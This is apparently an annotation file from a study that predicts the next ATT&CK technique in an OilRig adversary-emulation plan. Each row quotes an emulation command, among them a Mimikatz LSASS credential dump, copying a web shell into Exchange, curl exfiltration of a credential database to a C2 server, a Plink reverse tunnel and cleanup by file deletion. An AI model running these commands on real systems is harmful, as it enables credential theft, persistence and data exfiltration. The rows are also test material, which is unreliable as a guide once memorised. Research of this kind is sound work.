annotation_id,sample_id,source_org,plan_id,scenario_id,prefix_len,state,true_label,top1_pred,true_rank,current_access_context,exhausted_action_constraint,next_target_artifact,next_micro_verb,label_confidence,annotation_notes,ann_num,matched_yaml_pos_0based,matched_suffix_len,prefix_seq_len,matched_step_idx,matched_technique_attack_id,matched_parent_tid,matched_technique_name,matched_description,matched_command_summary,alignment_ok
ms_041,oilrig::unknown::26,oilrig,oilrig,unknown,26,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018 T1555 T1041 T1105 T1505 T1082 T1033 T1016 T1049 T1105,T1003,T1567,173,execution_on_host,credential_material_not_collected,credential_material,dump,human_verified,human_revised_v1,41,29,21,26,30,T1003.001,T1003,OS Credential Dumping: LSASS Memory,Dump credentials using Mimikatz,"curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit...",1
ms_042,oilrig::unknown::36,oilrig,oilrig,unknown,36,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018 T1555 T1041 T1105 T1505 T1082 T1033 T1016 T1049 T1105 T1003 T1041 T1070 T1105 T1572 T1021 T1105 T1569 T1083 T1048,T1070,T1567,171,execution_on_host,defense_evasion_path_not_established,process_or_file_identity,modify,human_verified,human_revised_v1,42,41,4,36,42,T1070.004,T1070,Indicator Removal on Host: File Deletion,Requires xdotool to be installed on the running machine. Emulates OilRig's cleanup and egress from the target network.,"sleep 3; rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost""); rdp_window=$(xdotool search --pid ""$rdp_pid""); sleep 3; xdotool type --window ""$rdp_window"" 'del C:\ProgramData\VMware\VMware.exe'; sleep 3; xdotool key --window ...",1
ms_043,oilrig::unknown::17,oilrig,oilrig,unknown,17,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018,T1555,T1016,148,execution_on_host,credential_material_not_collected,stored_credentials,collect,human_verified,human_revised_v1,43,20,12,17,21,T1555.004,T1555,Credentials from Password Stores: Windows Credential Manager,Create a SQLite database with output of Windows Credential Value for Internet Explorer,C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe,1
ms_044,oilrig::unknown::20,oilrig,oilrig,unknown,20,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018 T1555 T1041 T1105,T1505,T1567,131,execution_on_host,persistence_path_not_established,persistence_mechanism,modify,human_verified,human_revised_v1,44,23,15,20,24,T1505.003,T1505,Server Software Component: Web Shell,contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.,"copy C:\Users\Public\contact.aspx ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\""",1
ms_045,oilrig::unknown::12,oilrig,oilrig,unknown,12,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007,T1082,T1124,48,post_compromise_discovery,environment_not_enumerated,system_information,enumerate,human_verified,human_revised_v1,45,15,7,12,16,T1082,T1082,System Information Discovery,Gather detailed system information,systeminfo,1
ms_046,oilrig::unknown::16,oilrig,oilrig,unknown,16,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069,T1018,T1570,46,post_compromise_discovery,remote_targets_not_identified,remote_host_list,enumerate,human_verified,human_revised_v1,46,19,11,16,20,T1018,T1018,Remote System Discovery,Perform DNS lookup for WATERFALLS,nslookup #{second.target.host},1
ms_047,oilrig::unknown::18,oilrig,oilrig,unknown,18,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018 T1555,T1041,T1082,37,execution_on_host,exfiltration_path_not_established,exfiltration_channel,exfiltrate,human_verified,human_revised_v1,47,21,13,18,22,T1041,T1041,Exfiltration Over C2 Channel,Exfil the SQLite database fsociety.dat created by b.exe,"curl -F ""data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat"" --header ""X-Request-ID: #{initial.target.user}-#{paw}"" #{server}/file/upload",1
ms_048,oilrig::unknown::11,oilrig,oilrig,unknown,11,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057,T1007,T1210,4,post_compromise_discovery,host_service_inventory_not_enumerated,service_inventory,enumerate,human_verified,human_revised_v1,48,14,6,11,15,T1007,T1007,System Service Discovery,Gather information about registered local system services,sc query,1
ms_049,oilrig::unknown::1,oilrig,oilrig,unknown,1,T1082,T1033,T1016,3,post_compromise_discovery,current_user_context_not_confirmed,user_account_context,query,human_verified,human_revised_v1,49,1,1,1,2,T1033,T1033,System Owner/User Discovery,Executes the payload to collect the username of the victim machine.,cscript /nologo username.vbs,1
ms_050,oilrig::unknown::30,oilrig,oilrig,unknown,30,T1082 T1033 T1082 T1016 T1087 T1069 T1021 T1087 T1069 T1049 T1057 T1007 T1082 T1012 T1087 T1069 T1018 T1555 T1041 T1105 T1505 T1082 T1033 T1016 T1049 T1105 T1003 T1041 T1070 T1105,T1572,T1567,2,execution_on_host,remote_execution_path_not_established,command_execution_channel,execute,human_verified,human_revised_v1,50,33,25,30,34,T1572,T1572,Protocol Tunneling,Run Plink,"exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw ""#{caldera.user.password}"" #{caldera.server.ip}",1
